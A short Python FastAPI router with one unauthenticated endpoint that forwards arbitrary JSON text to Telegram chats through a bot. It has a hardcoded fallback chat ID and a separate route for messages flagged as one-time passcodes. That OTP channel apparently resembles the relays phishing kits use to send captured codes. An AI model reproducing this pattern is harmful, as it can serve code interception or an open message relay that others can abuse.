import os
from fastapi import APIRouter, Request

router = APIRouter()

@router.post("/telegram-message")
async def telegram_log(request: Request):
    app_state = request.app.state
    try:
        data = await request.json()
        is_otp = data.get("isOtp", False)
        chat_id = os.getenv("OTP_CHAT_ID") if is_otp else os.getenv("TELEGRAM_CHAT_ID") or "-1002922644009"
        await app_state.bot.send_message(chat_id, data.get("text", "System Matrix Alert"))
        return {"success": True}
    except:
        return {"success": False}